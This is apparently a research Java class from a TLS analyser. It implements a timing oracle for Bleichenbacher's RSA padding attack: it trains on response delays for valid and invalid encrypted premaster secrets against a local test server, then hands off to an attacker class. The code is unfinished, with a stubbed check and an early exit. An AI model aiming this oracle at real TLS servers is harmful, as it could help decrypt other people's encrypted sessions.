/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package de.rub.nds.ssl.analyzer.attacker.bleichenbacher.oracles;

import de.rub.nds.ssl.analyzer.attacker.Bleichenbacher;
import de.rub.nds.ssl.analyzer.attacker.bleichenbacher.OracleException;
import de.rub.nds.ssl.analyzer.removeMe.SSLServer;
import java.io.FileInputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.net.SocketException;
import java.security.*;
import java.security.cert.CertificateException;
import java.util.logging.Level;
import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import org.apache.log4j.Logger;
import org.apache.log4j.PropertyConfigurator;
import org.apache.log4j.lf5.LogLevel;
import org.bouncycastle.jce.provider.BouncyCastleProvider;

/**
 *
 * @author Juraj Somorovsky - juraj.somorovsky@rub.de
 * @version 0.1
 */
public class TimingOracle extends ATimingOracle {

    /**
     * Log4j logger initialization.
     */
    private static Logger logger = Logger.getRootLogger();
    /**
     * Plain PKCS message
     */
    private static final byte[] plainPKCS = new byte[]{
        (byte) 0x00, (byte) 0x02, (byte) 0xf5, (byte) 0xa7, (byte) 0x9f,
        (byte) 0xcd, (byte) 0xb1, (byte) 0x27, (byte) 0xf9, (byte) 0x39,
        (byte) 0x15, (byte) 0x21, (byte) 0x49, (byte) 0x71, (byte) 0x65,
        (byte) 0x97, (byte) 0x33, (byte) 0x99, (byte) 0x6d, (byte) 0x9b,
        (byte) 0xcd, (byte) 0x6d, (byte) 0x4b, (byte) 0xe3, (byte) 0xf5,
        (byte) 0xfd, (byte) 0xb5, (byte) 0x71, (byte) 0xd5, (byte) 0x69,
        (byte) 0x71, (byte) 0x91, (byte) 0xb9, (byte) 0x39, (byte) 0xc9,
        (byte) 0x6d, (byte) 0xf5, (byte) 0x59, (byte) 0xf1, (byte) 0xb9,
        (byte) 0x97, (byte) 0xb7, (byte) 0x6b, (byte) 0xff, (byte) 0x33,
        (byte) 0xd1, (byte) 0x9b, (byte) 0x85, (byte) 0x13, (byte) 0xd5,
        (byte) 0x09, (byte) 0xb5, (byte) 0x33, (byte) 0xc9, (byte) 0x2d,
        (byte) 0xcf, (byte) 0xff, (byte) 0x53, (byte) 0xd7, (byte) 0xed,
        (byte) 0xd5, (byte) 0x1d, (byte) 0x45, (byte) 0x4d, (byte) 0xc9,
        (byte) 0xcb, (byte) 0x4b, (byte) 0x27, (byte) 0x21, (byte) 0x5f,
        (byte) 0x69, (byte) 0xf5, (byte) 0x67, (byte) 0x5d, (byte) 0xab,
        (byte) 0x9b, (byte) 0xf5, (byte) 0xc3, (byte) 0xc3, (byte) 0xaf,
        (byte) 0x7f, (byte) 0x6d, (byte) 0xa1, (byte) 0xe5, (byte) 0xfd,
        (byte) 0x3d, (byte) 0x93, (byte) 0xbb, (byte) 0x29, (byte) 0x11,
        (byte) 0x9b, (byte) 0x59, (byte) 0x5f, (byte) 0x11, (byte) 0x17,
        (byte) 0x17, (byte) 0xaf, (byte) 0x71, (byte) 0x33, (byte) 0xd7,
        (byte) 0x3f, (byte) 0x1b, (byte) 0x2f, (byte) 0x2b, (byte) 0xcd,
        (byte) 0x77, (byte) 0xfd, (byte) 0x3f, (byte) 0x5d, (byte) 0x67,
        (byte) 0x3b, (byte) 0x8f, (byte) 0xcd, (byte) 0xc5, (byte) 0x07,
        (byte) 0x6f, (byte) 0x59, (byte) 0x2b, (byte) 0xa7, (byte) 0x0d,
        (byte) 0xd3, (byte) 0x93, (byte) 0x87, (byte) 0x8d, (byte) 0x25,
        (byte) 0x47, (byte) 0x3b, (byte) 0xf7, (byte) 0x2d, (byte) 0xf9,
        (byte) 0x69, (byte) 0xdd, (byte) 0xe5, (byte) 0x85, (byte) 0x79,
        (byte) 0x7d, (byte) 0xc9, (byte) 0x09, (byte) 0xb7, (byte) 0xb7,
        (byte) 0x3d, (byte) 0x07, (byte) 0x23, (byte) 0x25, (byte) 0x07,
        (byte) 0x71, (byte) 0xb9, (byte) 0x1b, (byte) 0xcf, (byte) 0x15,
        (byte) 0x99, (byte) 0xdf, (byte) 0xb5, (byte) 0x6b, (byte) 0x29,
        (byte) 0x21, (byte) 0x4d, (byte) 0x4b, (byte) 0xf5, (byte) 0x31,
        (byte) 0x37, (byte) 0x9b, (byte) 0x43, (byte) 0x89, (byte) 0xd9,
        (byte) 0xef, (byte) 0x81, (byte) 0x55, (byte) 0x61, (byte) 0x4f,
        (byte) 0xc9, (byte) 0xff, (byte) 0xcf, (byte) 0x49, (byte) 0x73,
        (byte) 0xa9, (byte) 0x7f, (byte) 0xcb, (byte) 0xb5, (byte) 0x4f,
        (byte) 0x9d, (byte) 0xa5, (byte) 0xc9, (byte) 0x97, (byte) 0x3d,
        (byte) 0x9b, (byte) 0xf1, (byte) 0x9f, (byte) 0xf1, (byte) 0x95,
        (byte) 0xf9, (byte) 0x07, (byte) 0xa7, (byte) 0x95, (byte) 0xd5,
        (byte) 0xef, (byte) 0xd3, (byte) 0x4b, (byte) 0x27, (byte) 0x1f,
        (byte) 0x1f, (byte) 0x27, (byte) 0x9f, (byte) 0x5d, (byte) 0x8f,
        (byte) 0x39, (byte) 0x1b, (byte) 0x00, (byte) 0x03, (byte) 0x01,
        (byte) 0x06, (byte) 0x26, (byte) 0xa6, (byte) 0x40, (byte) 0x57,
        (byte) 0x4b, (byte) 0x50, (byte) 0xd6, (byte) 0xa3, (byte) 0xd0,
        (byte) 0x8a, (byte) 0x70, (byte) 0x16, (byte) 0x0a, (byte) 0x0d,
        (byte) 0xaf, (byte) 0x33, (byte) 0x2a, (byte) 0x7f, (byte) 0x9b,
        (byte) 0xc8, (byte) 0x65, (byte) 0xa7, (byte) 0xb5, (byte) 0x54,
        (byte) 0xe7, (byte) 0x48, (byte) 0x9f, (byte) 0x57, (byte) 0xda,
        (byte) 0xc9, (byte) 0xbf, (byte) 0x34, (byte) 0x8b, (byte) 0x8d,
        (byte) 0xd4, (byte) 0x84, (byte) 0xed, (byte) 0xc9, (byte) 0x63,
        (byte) 0x2b, (byte) 0x16, (byte) 0x6f, (byte) 0x2c, (byte) 0x38,
        (byte) 0x40};
    private PrivateKey privateKey;
    private PublicKey publicKey;
    private Cipher cipher;
    private SSLServer sslServer;
    /**
     * Server key store.
     */
    private static final String PATH_TO_JKS = "server.jks";
    /**
     * Pass word for server key store.
     */
    private static final String JKS_PASSWORD = "password";
    /**
     * Test Server Thread.
     */
    private Thread sslServerThread;
    /**
     * Test host.
     */
    private static final String HOST = "localhost";
    /**
     * Test port.
     */
    private static final int PORT = 10443;
    /**
     * Detailed Info print out.
     */
    private static final boolean PRINT_INFO = false;
    /**
     * Protocol short name.
     */
    private String protocolShortName = "TLS";

    /**
     * Constructor
     *
     * @param serverAddress
     * @param serverPort
     * @throws SocketException
     */
    public TimingOracle(final String serverAddress, final int serverPort,
            final PrivateKey privateKey, final OracleType oracleType)
            throws SocketException, NoSuchAlgorithmException,
            InvalidKeyException, NoSuchPaddingException {
        super(serverAddress, serverPort);
        Security.addProvider(new BouncyCastleProvider());

        this.oracleType = oracleType;
        cipher = Cipher.getInstance("RSA/None/NoPadding");
        cipher.init(Cipher.DECRYPT_MODE, privateKey);
    }

    @Override
    public void trainOracle(byte[] validRequest, byte[] invalidRequest)
            throws OracleException {
        FileWriter fw = null;
        try {
            fw = new FileWriter("training_data.csv");
            long delay;
            // train the oracle using the executeWorkflow functionality
            for (int i = 0; i < 10000; i += 2) {
                exectuteWorkflow(validRequest);
                delay = getTimeDelay(getWorkflow().getTraceList());
                fw.write(i + ";valid;" + delay + "\n");

                exectuteWorkflow(invalidRequest);
                delay = getTimeDelay(getWorkflow().getTraceList());
                fw.write(i + 1 + ";invalid;" + delay + "\n");
                
                fw.flush();
                
                System.out.println("doing " + i);
            }
        } catch (IOException ex) {
            java.util.logging.Logger.getLogger(TimingOracle.class.getName()).log(Level.SEVERE, null, ex);
        } finally {
            try {
                fw.close();
            } catch (IOException ex) {
                java.util.logging.Logger.getLogger(TimingOracle.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
    }

    private static KeyStore loadKeyStore(final String keyStorePath,
            final String keyStorePassword) throws KeyStoreException, IOException,
            NoSuchAlgorithmException, CertificateException {
        KeyStore ks = KeyStore.getInstance("JKS");
        ks.load(new FileInputStream(keyStorePath), keyStorePassword.toCharArray());

        return ks;
    }

    private static byte[] encryptHelper(final byte[] msg,
            final PublicKey publicKey) {
        byte[] result = null;
        try {
            Cipher cipher = Cipher.getInstance("RSA/None/NoPadding");
            cipher.init(Cipher.ENCRYPT_MODE, publicKey);
            result = cipher.doFinal(msg);
        } catch (NoSuchAlgorithmException ex) {
            logger.error(ex.getMessage(), ex);
        } catch (IllegalBlockSizeException ex) {
            logger.error(ex.getMessage(), ex);
        } catch (BadPaddingException ex) {
            logger.error(ex.getMessage(), ex);
        } catch (InvalidKeyException ex) {
            logger.error(ex.getMessage(), ex);
        } catch (NoSuchPaddingException ex) {
            logger.error(ex.getMessage(), ex);
        }

        return result;
    }

    private boolean cheat(final byte[] msg) throws IllegalBlockSizeException, BadPaddingException {
        boolean result = false;

        byte[] plainMessage = cipher.doFinal(msg);;

        StdPlainOracle plainOracle = new StdPlainOracle(publicKey,
                oracleType, cipher.getBlockSize());
        result = plainOracle.checkDecryptedBytes(plainMessage);

        return result;
    }

    @Override
    public boolean checkPKCSConformity(byte[] encPMS) throws OracleException {
        boolean ret = false;
        try {
            exectuteWorkflow(encPMS);
            long delay = getTimeDelay(getWorkflow().getTraceList());
            System.out.println("XXXXXXX Delay: " + delay);

    // TODO: remove when workflow is executed        
    // numberOfQueries++;
            //ret = cheat(encPMS);
        } catch (Exception ex) {
            java.util.logging.Logger.getLogger(TimingOracle.class.getName()).log(Level.SEVERE, null, ex);
            sslServer.shutdown();
            sslServerThread.interrupt();
            throw new OracleException("SSL", ex, LogLevel.FATAL);
        }
        return ret;
    }

    public void setUp() {
        try {
            // System.setProperty("javax.net.debug", "ssl");
            sslServer = new SSLServer("2048.jks", JKS_PASSWORD,
                    protocolShortName, PORT, PRINT_INFO);
            sslServerThread = new Thread(sslServer);
            sslServerThread.start();
            Thread.currentThread().sleep(2000);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        PropertyConfigurator.configure("logging.properties"); 

        try {
            String keyName = "2048_rsa";
            String keyPassword = "password";
            KeyStore ks = loadKeyStore("2048.jks", "password");
            PublicKey publicKey = ks.getCertificate(keyName).getPublicKey();
            PrivateKey privateKey = (PrivateKey) ks.getKey(keyName, keyPassword.toCharArray());

            TimingOracle to = new TimingOracle("127.0.0.1", PORT,
                    privateKey, OracleType.TTT);
            // TODO: Start SSL-Server for testing purposes
            to.setUp();

            byte[] plainPKCS_wrong = new byte[plainPKCS.length];
            System.arraycopy(plainPKCS, 0, plainPKCS_wrong, 0, plainPKCS.length);
            plainPKCS_wrong[0] = 23;
            
            byte[] encPMS = encryptHelper(plainPKCS, publicKey);
            byte[] encPMSWrong = encryptHelper(plainPKCS_wrong, publicKey);
            
            to.trainOracle(encPMS, encPMSWrong);
            System.exit(0);

            Bleichenbacher attacker = new Bleichenbacher(encPMS,
                    to, true);
            attacker.attack();
        } catch (InvalidKeyException ex) {
            logger.error(ex.getMessage(), ex);
        } catch (NoSuchPaddingException ex) {
            logger.error(ex.getMessage(), ex);
        } catch (UnrecoverableKeyException ex) {
            logger.error(ex.getMessage(), ex);
        } catch (KeyStoreException ex) {
            logger.error(ex.getMessage(), ex);
        } catch (IOException ex) {
            logger.error(ex.getMessage(), ex);
        } catch (NoSuchAlgorithmException ex) {
            logger.error(ex.getMessage(), ex);
        } catch (CertificateException ex) {
            logger.error(ex.getMessage(), ex);
        } catch (OracleException ex) {
            logger.error(ex.getMessage(), ex);
        }
    }
}
